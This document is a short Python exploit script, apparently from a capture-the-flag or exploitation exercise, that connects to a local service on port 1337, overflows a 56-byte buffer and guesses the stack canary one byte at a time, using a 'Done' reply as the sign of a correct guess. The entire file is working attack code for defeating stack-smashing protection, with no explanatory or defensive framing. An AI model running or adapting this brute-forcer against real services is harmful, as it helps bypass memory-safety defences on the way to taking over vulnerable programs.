#!/usr/bin/env python3

import socket
import struct

TARGET_HOST = "127.0.0.1"
TARGET_PORT = 1337

BUF_SPACE = 56
CANARY_SIZE = 8

def p8(x):
    return struct.pack('B', x)

def test_payload(buf):
    r = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    r.connect((TARGET_HOST, TARGET_PORT))
    
    try:
        r.recv(1000)
        r.send(buf)
        d = r.recv(1000)
        r.close()
        return False if (d.find(b'Done') == -1) else True
    except EOFError:
        r.close()
        return False

def brute_canary():
    canary = 0
    buf = b'A' * BUF_SPACE

    for x in range(0, CANARY_SIZE):
        for y in range(0, 0xff+1):
            print("Pos:%d Byte:%s Canary:%s Bufsize:%d" % (x, hex(y), hex(canary), len(buf)))
            if test_payload(buf + p8(y)):
                canary = canary | (y << (x*8))
                buf = buf + p8(y)
                break

    print("Canary: " + hex(canary))
    return canary

brute_canary()
